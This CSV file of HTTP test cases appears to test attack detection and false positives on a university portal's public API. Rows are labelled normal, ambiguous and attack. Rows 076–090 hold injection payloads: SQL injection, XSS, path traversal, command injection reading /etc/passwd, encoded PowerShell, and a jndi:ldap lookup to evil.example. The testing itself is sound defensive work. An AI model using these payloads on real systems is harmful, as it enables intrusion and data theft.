case_id,case_class,request_intent,http_method,request_path,content_type,request_body,auth_scope,capture_var,capture_expr,accepted_codes
public_024,normal,public-normal,GET,/api/public/announcements?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&dateFrom=2026-02-01&dateTo=2026-04-30&sort=latest&page=0&size=5,,,none,,,200|404
public_025,normal,public-normal,GET,/api/public/announcements?keyword=%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC&dateFrom=2026-02-01&dateTo=2026-04-30&sort=title&page=0&size=5,,,none,,,200|404
public_026,normal,public-normal,GET,/api/public/announcements?keyword=%EC%A4%91%EA%B0%84%EA%B3%A0%EC%82%AC&sort=latest&page=0&size=5,,,none,,,200|404
public_027,normal,public-normal,GET,/api/public/announcements?keyword=%EC%BA%A0%ED%8D%BC%EC%8A%A4&sort=title&page=0&size=5,,,none,,,200|404
public_028,normal,public-normal,GET,/api/public/announcements?keyword=%EA%B0%9C%EA%B0%95&sort=oldest&page=0&size=5,,,none,,,200|404
public_029,normal,public-normal,GET,/api/public/announcements?keyword=%EC%9A%B4%EC%98%81%EC%8B%9C%EA%B0%84&sort=latest&page=0&size=5,,,none,,,200|404
public_030,normal,public-normal,GET,/api/public/announcements?keyword=%EA%B3%B5%EC%A7%80&sort=latest&page=0&size=10,,,none,,,200|404
public_031,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-31"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-31@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_032,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-32"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-32@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_033,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-33"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-33@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_034,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-34"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-34@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_035,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-35"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-35@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_036,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-36"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-36@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_037,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-37"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-37@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_038,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-38"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-38@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_039,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-39"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-39@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_040,normal,support-normal,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""일반 문의 ${__property(mixed500_run_id)}-40"",""message"":""포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-40@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_041,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&sort=latest&page=0&size=5,,,none,,,200|400
public_042,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=script%20%ED%83%9C%EA%B7%B8%20%ED%8A%B9%EA%B0%95&sort=title&page=0&size=5,,,none,,,200|400
public_043,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=query%20string%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=5,,,none,,,200|400
public_044,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=SQL%20injection%20%EA%B5%90%EC%9C%A1&sort=title&page=0&size=5,,,none,,,200|400
public_045,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=XSS%20payload%20%EB%A9%94%EB%AA%A8&sort=latest&page=0&size=5,,,none,,,200|400
public_046,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=alert%20tcp%20%EB%A1%9C%EA%B7%B8&sort=title&page=0&size=5,,,none,,,200|400
public_047,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=cmd.exe%20%EB%AC%B8%EC%9E%90%EC%97%B4%20%EC%98%88%EC%8B%9C&sort=latest&page=0&size=5,,,none,,,200|400
public_048,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=powershell%20-enc%20%EC%84%A4%EB%AA%85&sort=title&page=0&size=5,,,none,,,200|400
public_049,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=LFI%20%EA%B2%BD%EB%A1%9C%20%ED%95%B4%EC%84%A4&sort=latest&page=0&size=5,,,none,,,200|400
public_050,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=..%2Fadmin%20%EB%AC%B8%EB%A7%A5%20%EC%84%A4%EB%AA%85&sort=title&page=0&size=5,,,none,,,200|400
public_051,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=sleep%20%ED%95%A8%EC%88%98%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=5,,,none,,,200|400
public_052,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=shellshock%20note&sort=title&page=0&size=5,,,none,,,200|400
public_053,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=base64%20%EC%9D%B8%EC%BD%94%EB%94%A9%20%EC%9A%B0%ED%9A%8C&sort=latest&page=0&size=5,,,none,,,200|400
public_054,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=jndi%20%EC%84%A4%EB%AA%85%20%EC%9E%90%EB%A3%8C&sort=title&page=0&size=5,,,none,,,200|400
public_055,ambiguous,announcement-ambiguous-query,GET,/api/public/announcements?keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%A0%95%EC%B1%85&sort=latest&page=0&size=5,,,none,,,200|400
public_056,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-56"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-56@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_057,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-57"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-57@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_058,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-58"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-58@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_059,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-59"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-59@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_060,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-60"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-60@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_061,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-61"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-61@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_062,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-62"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-62@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_063,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-63"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-63@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_064,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-64"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-64@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_065,ambiguous,support-ambiguous-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""보안 교육 문의 ${__property(mixed500_run_id)}-65"",""message"":""select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-65@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_066,ambiguous,public-url-typo,GET,/api/public/annuncements,,,none,,,200|400|404
public_067,ambiguous,public-url-typo,GET,/api/public/announcement,,,none,,,200|400|404
public_068,ambiguous,public-url-typo,GET,/api/public/announcements/,,,none,,,200|400|404
public_069,ambiguous,public-url-typo,GET,/api/public/announcements//,,,none,,,200|400|404
public_070,ambiguous,public-url-typo,GET,/api//public/announcements,,,none,,,200|400|404
public_071,ambiguous,public-url-typo,GET,/api/public//announcements,,,none,,,200|400|404
public_072,ambiguous,public-url-typo,GET,/API/public/announcements,,,none,,,200|400|404
public_073,ambiguous,public-url-typo,GET,/api/public/Academic-events,,,none,,,200|400|404
public_074,ambiguous,public-url-typo,GET,/api/public/acaedmic-events,,,none,,,200|400|404
public_075,ambiguous,public-url-typo,GET,/api/public/academic-events/,,,none,,,200|400|404
public_076,attack,announcement-attack-query,GET,/api/public/announcements?keyword=%27%20OR%20%271%27%3D%271&sort=latest&page=0&size=5,,,none,,,200|400
public_077,attack,announcement-attack-query,GET,/api/public/announcements?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=latest&page=0&size=5,,,none,,,200|400
public_078,attack,announcement-attack-query,GET,/api/public/announcements?keyword=..%2Fadmin&sort=latest&page=0&size=5,,,none,,,200|400
public_079,attack,announcement-attack-query,GET,/api/public/announcements?keyword=%3Bwhoami&sort=latest&page=0&size=5,,,none,,,200|400
public_080,attack,announcement-attack-query,GET,/api/public/announcements?keyword=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D&sort=latest&page=0&size=5,,,none,,,200|400
public_081,attack,announcement-attack-query,GET,/api/public/announcements?keyword=cmd.exe%20%2Fc%20whoami&sort=latest&page=0&size=5,,,none,,,200|400
public_082,attack,announcement-attack-query,GET,/api/public/announcements?keyword=powershell%20-enc%20ZQB2AGkAbAA%3D&sort=latest&page=0&size=5,,,none,,,200|400
public_083,attack,announcement-attack-query,GET,/api/public/announcements?keyword=%7Ccat%20%2Fetc%2Fpasswd&sort=latest&page=0&size=5,,,none,,,200|400
public_084,attack,announcement-attack-query,GET,/api/public/announcements?keyword=waitfor%20delay%20%270%3A0%3A5%27--&sort=latest&page=0&size=5,,,none,,,200|400
public_085,attack,announcement-attack-query,GET,/api/public/announcements?keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,,,none,,,200|400
public_086,attack,support-attack-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""공격성 문자열 테스트 ${__property(mixed500_run_id)}-86"",""message"":""<script>alert(1)</script>, ;whoami, ../etc/passwd 같은 문자열을 포함한 명확한 공격성 본문 전송 테스트입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-86@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_087,attack,support-attack-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""공격성 문자열 테스트 ${__property(mixed500_run_id)}-87"",""message"":""<script>alert(1)</script>, ;whoami, ../etc/passwd 같은 문자열을 포함한 명확한 공격성 본문 전송 테스트입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-87@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_088,attack,support-attack-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""공격성 문자열 테스트 ${__property(mixed500_run_id)}-88"",""message"":""<script>alert(1)</script>, ;whoami, ../etc/passwd 같은 문자열을 포함한 명확한 공격성 본문 전송 테스트입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-88@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_089,attack,support-attack-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""공격성 문자열 테스트 ${__property(mixed500_run_id)}-89"",""message"":""<script>alert(1)</script>, ;whoami, ../etc/passwd 같은 문자열을 포함한 명확한 공격성 본문 전송 테스트입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-89@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_090,attack,support-attack-body,POST,/api/public/support-requests,application/json,"{""category"":""PORTAL"",""subject"":""공격성 문자열 테스트 ${__property(mixed500_run_id)}-90"",""message"":""<script>alert(1)</script>, ;whoami, ../etc/passwd 같은 문자열을 포함한 명확한 공격성 본문 전송 테스트입니다."",""contactEmail"":""portal-${__property(mixed500_run_id)}-90@example.com"",""referenceUrl"":""http://www.kj.ac.kr/support-center""}",none,,,201|400
public_091,normal,public-normal-tail,GET,/api/public/announcements?keyword=%EB%B3%B4%EC%95%88%20%EB%AC%B8%EC%9E%90%EC%97%B4%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=10,,,none,,,200|404
public_092,normal,public-normal-tail,GET,/api/public/announcements?keyword=%EA%B5%90%EC%9C%A1%EC%9A%A9%20%EC%98%88%EC%8B%9C&sort=title&page=0&size=10,,,none,,,200|404
public_093,normal,public-normal-tail,GET,/api/public/announcements?keyword=%EB%AC%B8%EC%9E%90%EC%97%B4&sort=latest&page=0&size=10,,,none,,,200|404
public_094,normal,public-normal-tail,GET,/api/public/announcements/1,,,none,,,200|404
public_095,normal,public-normal-tail,GET,/api/public/academic-events,,,none,,,200|404
public_096,normal,public-normal-tail,GET,/api/health,,,none,,,200|404
public_097,ambiguous,public-ambiguous-tail,GET,/api/public/announcements?keyword=%EC%98%A4%ED%83%90&sort=latest&page=0&size=10,,,none,,,200|404
public_098,ambiguous,public-ambiguous-tail,GET,/api/public/announcements?keyword=WAF&sort=title&page=0&size=10,,,none,,,200|404
public_099,normal,public-normal-tail,GET,/api/public/announcements?keyword=%EC%8B%A4%EC%8A%B5&sort=latest&page=0&size=10,,,none,,,200|404
public_100,normal,public-normal-tail,GET,/api/public/announcements?keyword=%EC%A0%95%EC%83%81%20%EC%9A%94%EC%B2%AD&sort=latest&page=0&size=10,,,none,,,200|404
